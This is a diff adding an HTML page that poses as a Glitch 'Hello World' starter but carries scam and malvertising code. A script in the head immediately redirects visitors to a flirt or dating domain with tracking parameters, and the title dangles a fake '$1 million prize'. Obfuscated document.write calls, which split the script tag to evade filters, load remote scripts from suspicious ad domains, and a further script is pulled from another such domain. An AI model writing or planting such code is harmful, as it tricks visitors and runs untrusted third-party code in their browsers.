@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <html>
+<head>
+    <script>
+        window.location.href = "https://passionateflirt.life/?u=8akp607&o=4q8wycu";
+    </script>
+</head>
+</html>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="icon" href="https://glitch.com/favicon.ico" />
+
+    <title>Congratulations on your $1 million prize
+</title>
+
+    <meta name="robots" content="index,follow" />
+    <meta property="og:title" content="Hello World!" />
+    
+    <!-- import the webpage's stylesheet -->
+    <link rel="stylesheet" href="/style.css" />
+
+
+    <style type="text/css">
+  .mobileShow {display: none;}
+
+  /* Smartphone Portrait and Landscape */
+  @media only screen
+    and (min-device-width : 320px)
+    and (max-device-width : 480px){ 
+      .mobileShow {display: inline;}
+  }
+  .mobileHide { display: inline; }
+
+  /* Smartphone Portrait and Landscape */
+  @media only screen
+    and (min-device-width : 320px)
+    and (max-device-width : 480px){
+     .mobileHide { display: none;}
+  }
+</style>
+  </head>
+  <body>
+    <!-- the wrapper and content divs set margins and positioning -->
+    <div class="wrapper">
+      <div class="content" role="main">
+        <!-- this is the start of content for our page -->
+        <h1 class="title">Hello World!</h1>
+
+      </div>
+     <div class="mobileShow">
+<script type="text/javascript">
+	atOptions = {
+		'key' : '0303d891ce479628509ef2972f7239d6',
+		'format' : 'iframe',
+		'height' : 300,
+		'width' : 160,
+		'params' : {}
+	};
+	document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://wizardunstablecommissioner.com/0303d891ce479628509ef2972f7239d6/invoke.js"></scr' + 'ipt>');
+</script> </div> 
+      <div class="mobileHide"> <script type="text/javascript">
+	atOptions = {
+		'key' : 'd6744e6de34f83085d99817829bdfc87',
+		'format' : 'iframe',
+		'height' : 90,
+		'width' : 728,
+		'params' : {}
+	};
+	document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://wizardunstablecommissioner.com/d6744e6de34f83085d99817829bdfc87/invoke.js"></scr' + 'ipt>');
+</script></div>
+    </div>
+<script type='text/javascript' src='//basketballshameless.com/4b/ae/47/4bae474b070d2ab3d4fa98d0a8c7c314.js'></script>
+  </body>
+</html>
